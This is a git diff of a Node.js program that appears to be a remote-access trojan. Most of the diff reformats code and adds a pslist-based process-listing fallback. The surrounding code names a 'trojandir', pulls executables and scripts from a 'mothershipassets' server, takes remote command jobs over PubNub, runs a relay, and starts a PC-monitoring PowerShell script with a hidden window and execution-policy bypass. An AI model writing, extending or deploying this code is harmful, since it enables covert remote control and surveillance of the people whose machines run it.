@@ -15,7 +15,10 @@ debugger;
 // anchor
 const path = require("path");
 module.paths.push(
-    path.resolve(__dirname, "C:\\ProgramData\\owd\\node\\node-v26.4.0-win-x64\\node_modules")
+    path.resolve(
+        __dirname,
+        "C:\\ProgramData\\owd\\node\\node-v26.4.0-win-x64\\node_modules"
+    )
 );
 
 const PubNub = require("pubnub");
@@ -26,7 +29,7 @@ const os = require("os");
 const crypto = require("crypto");
 const util = require("util");
 
-const ISDEBUG = true; 
+const ISDEBUG = true;
 
 // { CommandLine:'...', Name:'...', ProcessId:'...' }
 var processlist = initProcessList();
@@ -432,7 +435,7 @@ class CmdConfig {
     // should be overriden by implementing cmd
     loopfunc = async () => {
         logmsg("pss");
-    }; 
+    };
 
     newCmdConfig(tcmdname) {
         let childcmd = new CmdConfig(tcmdname, this);
@@ -898,28 +901,99 @@ function getFileMD5(fpath) {
     return crypto.createHash("md5").update(fileBuffer).digest("hex");
 }
 
+async function exec_pslist() {
+    let pslisttxt = "";
 
-function getProcessList_pslist() {
+    let exepath = path.join(systemstate.trojandir, "pslist.exe");
 
+    if (!fileExists(exepath)) {
+        throw new Error("pslist.exe does not exist ");
+    }
+
+    let childp = await invoke_exe(
+        "pslist.exe",
+        null,
+        systemstate.trojandir,
+        (text) => {
+            pslisttxt += text;
+        },
+        null
+    );
+
+    return pslisttxt;
+}
+
+function isInteger(str) {
+    // Reject empty strings or spaces, which Number() converts to 0
+    if (typeof str !== "string" || str.trim() === "") return false;
+
+    return Number.isInteger(Number(str));
+}
+
+async function getProcessList_pslist() {
+    let pslisttxt = await exec_pslist();
+
+    let proclist = [];
+
+    const lines = pslisttxt.split(/\r?\n/).filter((line) => line.trim() !== "");
+
+    // Name                Pid Pri Thd  Hnd   Priv        CPU Time    Elapsed Time
+    let begin = false;
+    for (let i = 0; i < lines.length; i++) {
+        let tokens = lines[i]
+            .trim()
+            .split(/\s+/)
+            .filter((word) => word.trim() !== "");
+
+        if (!begin && !tokens.includes("Elapsed")) {
+            continue;
+        }
+
+        if (!begin) {
+            begin = true;
+            continue;
+        }
+
+        let procname = "";
+        let pid = "";
+
+        for (let j = 0; j < tokens.length; j++) {
+            let token = tokens[j];
+
+            if (!isInteger(token)) {
+                procname += " " + token;
+            } else {
+                pid = token;
+                break;
+            }
+        }
+
+        proclist.push({
+            ProcessId: pid,
+            Name: procname.trim(),
+            CommandLine: "",
+        });
+    }
+
+    return proclist;
 }
 
 function csvToJson(csvData) {
+    const lines = csvData.split(/\r?\n/).filter((line) => line.trim() !== "");
 
-    const lines = csvData.split(/\r?\n/).filter(line => line.trim() !== '');
+    const headers = lines[0].split(",");
 
-    const headers = lines[0].split(',');
-
-    lines.splice(0, 1); 
+    lines.splice(0, 1);
 
     const result = [];
 
     // Loop through the remaining rows
     for (let i = 0; i < lines.length; i++) {
         const obj = {};
-        const currentLine = lines[i].split(',');
+        const currentLine = lines[i].split(",");
 
         for (let j = 0; j < headers.length; j++) {
-            obj[headers[j].trim()] = currentLine[j]?.trim() || '';
+            obj[headers[j].trim()] = currentLine[j]?.trim() || "";
         }
         result.push(obj);
     }
@@ -929,23 +1003,21 @@ function csvToJson(csvData) {
     // fs.writeFileSync(jsonPath, JSON.stringify(result, null, 2), 'utf-8');
 }
 
-
 function isUTF16LEBuffer(buffer) {
     if (!Buffer.isBuffer(buffer) || buffer.length < 2) {
         return false;
     }
 
     // UTF-16LE BOM is 0xFF 0xFE
-    return buffer[0] === 0xFF && buffer[1] === 0xFE;
+    return buffer[0] === 0xff && buffer[1] === 0xfe;
 }
 
 async function exec_wmic() {
-
     return new Promise((resolve, reject) => {
-        const wmicCommand = 'wmic process get ProcessId,Name,CommandLine /format:csv';
+        const wmicCommand =
+            "wmic process get ProcessId,Name,CommandLine /format:csv";
 
         exec(wmicCommand, (error, stdout, stderr) => {
-            
             if (error) {
                 reject(error);
             }
@@ -956,38 +1028,24 @@ async function exec_wmic() {
 
             resolve(stdout);
         });
-
     });
-
-}
-
-async function exec_pslist() { // anchor
-    
-    return invoke_exe(
-        exename,
-        targs = null,
-        exedirpath = systemstate.trojandir,
-        stdoutfunc,
-        stderrfunc);
-
 }
 
 async function getProcessList_wmic() {
-
     let buffer = await exec_wmic();
     let isutf16le = isUTF16LEBuffer(buffer);
 
-    let csvData = isutf16le ? buffer.toString('utf16le') : buffer.toString('utf8'); 
+    let csvData = isutf16le
+        ? buffer.toString("utf16le")
+        : buffer.toString("utf8");
 
-    // { CommandLine, Name, Node, ProcessId }  
+    // { CommandLine, Name, Node, ProcessId }
     let jsondata = csvToJson(csvData);
 
     return jsondata;
 }
 
-
 async function getProcessList_ps() {
-
     return new Promise((resolve, reject) => {
         const psCommand = `Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine | ConvertTo-Json`;
 
@@ -1009,19 +1067,12 @@ async function getProcessList_ps() {
                 // ProcessId
 
                 resolve(processes);
-
-        });
-
+            }
+        );
     });
-
-}
-
-async function getProcessList_pslist() {
-
 }
 
 async function initProcessList() {
-
     let outproclist = [];
 
     try {
@@ -1030,7 +1081,17 @@ async function initProcessList() {
         logmsg(err);
     }
 
-    if ( outproclist && outproclist.length > 0 ) {
+    if (outproclist && outproclist.length > 0) {
+        return outproclist;
+    }
+
+    try {
+        outproclist = await getProcessList_pslist();
+    } catch (err) {
+        logmsg(err);
+    }
+
+    if (outproclist && outproclist.length > 0) {
         return outproclist;
     }
 
@@ -1040,10 +1101,9 @@ async function initProcessList() {
         logmsg(err);
     }
 
-    if ( outproclist && outproclist.length > 0 ) {
+    if (outproclist && outproclist.length > 0) {
         return outproclist;
     }
-
 }
 
 function getProcess(pid) {
@@ -1652,26 +1712,32 @@ function ping() {
     logmsg("finished");
 }
 
-function execPSScript(scriptfpath, cmdlineargsarr, execopts, stdoutfunc, stderrfunc) {
+function execPSScript(
+    scriptfpath,
+    cmdlineargsarr,
+    execopts,
+    stdoutfunc,
+    stderrfunc
+) {
     logmsg("starting");
 
     let enginename = "PS1";
 
     cmdlineargsarr = cmdlineargsarr || [];
     cmdlineargsarr = [
-            "-WindowStyle",
-            "Hidden",
-            "-NoProfile",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-File",
-            scriptfpath,
-            ...cmdlineargsarr,
+        "-WindowStyle",
+        "Hidden",
+        "-NoProfile",
+        "-ExecutionPolicy",
+        "Bypass",
+        "-File",
+        scriptfpath,
+        ...cmdlineargsarr,
     ];
 
-    let cwd = path.dirname(scriptfpath); 
+    let cwd = path.dirname(scriptfpath);
 
-    if ( ! execopts ) {
+    if (!execopts) {
         execopts = { cwd: cwd };
     }
 
@@ -1694,16 +1760,14 @@ function execPSScript(scriptfpath, cmdlineargsarr, execopts, stdoutfunc, stderrf
 
         fs.writeFileSync(stdoutfpath, data, "utf-8");
 
-        if ( stdoutfunc )
-            stdoutfunc(data);
+        if (stdoutfunc) stdoutfunc(data);
     });
 
     child.stderr.on("data", (data) => {
         logmsg(`STDERR: ${data.toString()}`);
         fs.writeFileSync(stderrfpath, data, "utf-8");
 
-        if ( stderrfunc )
-            stderrfunc(data);
+        if (stderrfunc) stderrfunc(data);
     });
 
     child.on("close", (code) => {
@@ -2313,7 +2377,7 @@ function relay() {
     // let cmdname = clientjob?.cmdname; // not used -- should be StartRelay
     let args = clientjob?.args;
     let enginename = (args ?? [])[0];
-    let browsername = enginename == 'PY' && args?.length > 1 ? args[1] : null;
+    let browsername = enginename == "PY" && args?.length > 1 ? args[1] : null;
 
     if (isNullOrWhitespace(enginename)) {
         throw new Error("cmdname must be StartRelay");
@@ -2474,7 +2538,7 @@ function cmdlist_handlecmdjob(clientjob, configfpath) {
     logmsg("starting");
 
     let cmdlistcmd = systemstate.cmdconfig;
-    
+
     let cmdname = clientjob.cmdname.toLowerCase();
 
     if (!CmdConfig.isCmdExist(cmdname)) {
@@ -2485,18 +2549,17 @@ function cmdlist_handlecmdjob(clientjob, configfpath) {
 
     let stopcmd = false;
 
-    if ( cmdname.startsWith("start") ) {
+    if (cmdname.startsWith("start")) {
         cmdname = cmdname.replace("start", "");
-    } else if ( cmdname.startsWith("stop") ) {
+    } else if (cmdname.startsWith("stop")) {
         cmdname = cmdname.replace("stop", "");
         stopcmd = true;
     }
 
-    if ( stopcmd ) {
-
+    if (stopcmd) {
         let jobcmd = cmdlistcmd.getChildCmd(cmdname);
 
-        if ( ! jobcmd ) {
+        if (!jobcmd) {
             throw new Error(`child cmd {cmdname} no in child cmd list`);
         }
 
@@ -2505,12 +2568,10 @@ function cmdlist_handlecmdjob(clientjob, configfpath) {
         };
 
         cmdlistcmd.sendMessage(jobcmd, "cmdlist", clientjob);
-
-    } else if ( ! stopcmd ) {
-
+    } else if (!stopcmd) {
         let jobcmd = cmdlistcmd.newCmdConfig(cmdname); // anchor
 
-        if ( ! jobcmd ) {
+        if (!jobcmd) {
             throw new Error(`could not create child cmd {cmdname}`);
         }
 
@@ -2522,7 +2583,7 @@ function cmdlist_handlecmdjob(clientjob, configfpath) {
 
         jobcmd.childprocess.unref();
     }
-    
+
     logmsg("finished");
 
     return;
@@ -2560,16 +2621,16 @@ async function cmdlist_handleMessage(msg) {
         throw new Error("clientjobconfigpath does note exist " + configfpath);
     }
 
-    if ( jobtype.toLowerCase() == 'EXEC_CMD'.toLowerCase() )  {
+    if (jobtype.toLowerCase() == "EXEC_CMD".toLowerCase()) {
         await cmdlist_handlecmdjob(clientjob, configfpath);
         return;
     }
 
     // TODO: validate clientjob object before launching command
-    
+
     let execjobcmd = cmdlistcmd.newCmdConfig("execjob");
 
-    if ( ! execjobcmd ) {
+    if (!execjobcmd) {
         throw new Error("could not create child cmd execjob");
     }
 
@@ -2646,13 +2707,11 @@ async function invoke_exe(
 ) {
     return new Promise((resolve, reject) => {
         const exePath = path.join(exedirpath, exename);
-        let child = null;
 
-        if (exename.slice(-4) == ".cmd") {
-            child = spawn(exePath, targs, { shell: true, windowsHide: true });
-        } else {
-            child = spawn(exePath, targs);
-        }
+        let child = spawn(exePath, targs, {
+            shell: exename.slice(-4) == ".cmd",
+            windowsHide: true,
+        });
 
         child.stdout.on("data", (data) => {
             logmsg(`stdout: ${data.toString()}`);
@@ -2678,7 +2737,6 @@ async function invoke_exe(
             logmsg("Failed to start child process:", err);
             reject(err);
         });
-
     });
 }
 
@@ -3161,9 +3219,15 @@ async function download_python() {
 async function retrieve() {
     logmsg("starting");
 
-    let assets = ["pythonrelay.py", "pc_monitoring.ps1", "nircmdc.exe", "7za.exe", "gunite.exe" ];
-    
-    for ( let i = 0; i<assets.length; i++ ) {
+    let assets = [
+        "pythonrelay.py",
+        "pc_monitoring.ps1",
+        "nircmdc.exe",
+        "7za.exe",
+        "gunite.exe",
+    ];
+
+    for (let i = 0; i < assets.length; i++) {
         let fname = assets[i];
         let baseUrl = systemstate.mothershipassets + "/" + fname;
 
@@ -3196,14 +3260,12 @@ function cleanup() {
 }
 
 // doesn't work on TPL machines
-function pcmon() {
-
-}
+function pcmon() {}
 
 async function download_pspcmon() {
-    logmsg('starting');
+    logmsg("starting");
 
-    let filename = 'pc_monitoring.ps1'; 
+    let filename = "pc_monitoring.ps1";
     let baseUrl = systemstate.mothershipassets + "/" + filename;
     let localpath = path.join(systemstate.pspcmondir, filename);
 
@@ -3224,32 +3286,31 @@ async function download_pspcmon() {
         statusText
         headers */
 
-    if ( ! fileExists(localpath) ) {
-        return { state:false, msg:"download failed for " + localpath };
+    if (!fileExists(localpath)) {
+        return { state: false, msg: "download failed for " + localpath };
     }
 
     const stats = fs.statSync(localpath);
     logmsg(`${localpath} -- File size: ${stats.size} bytes`);
 
-    logmsg('finished');
+    logmsg("finished");
 
-    return { state:true };
+    return { state: true };
 }
 
 async function pspcmon() {
-
-    logmsg('starting');
+    logmsg("starting");
 
     let pspcmoncmd = systemstate.cmdconfig;
 
-    let scriptfpath = path.join(systemstate.pspcmondir, 'pc_monitoring.ps1');
+    let scriptfpath = path.join(systemstate.pspcmondir, "pc_monitoring.ps1");
 
-    if ( ! fileExists(scriptfpath) ) {
+    if (!fileExists(scriptfpath)) {
         await download_pspcmon();
     }
 
-    if ( ! fileExists(scriptfpath) ) {
-        throw new Error('pspcmon script does not exist '+scriptfpath);
+    if (!fileExists(scriptfpath)) {
+        throw new Error("pspcmon script does not exist " + scriptfpath);
     }
 
     let killswitch = false;
@@ -3263,7 +3324,7 @@ async function pspcmon() {
 
         logmsg("received new client job: " + JSON.stringify(clientjob));
 
-        if ( clientjob?.cmdname.toLowerCase() == 'StopPSPCMon'.toLowerCase() ) {
+        if (clientjob?.cmdname.toLowerCase() == "StopPSPCMon".toLowerCase()) {
             killswitch = true;
         }
     };
@@ -3275,25 +3336,20 @@ async function pspcmon() {
 
         let tcmdpid = childp?.pid ?? -1;
 
-        if ( killswitch ) {
-            
-            if ( isPidAlive(tcmdpid) )
-                childp.kill(); 
+        if (killswitch) {
+            if (isPidAlive(tcmdpid)) childp.kill();
 
-            if ( isPidAlive(tcmdpid) )
-                childp.kill('SIGKILL'); 
-        
+            if (isPidAlive(tcmdpid)) childp.kill("SIGKILL");
         }
 
-        if ( (! killswitch) && (!isPidAlive(tcmdpid)) ) {
+        if (!killswitch && !isPidAlive(tcmdpid)) {
             childp = execPSScript(scriptfpath);
         }
-
     };
 
     pspcmoncmd.loop();
 
-    logmsg('finished');
+    logmsg("finished");
 }
 
 // ---
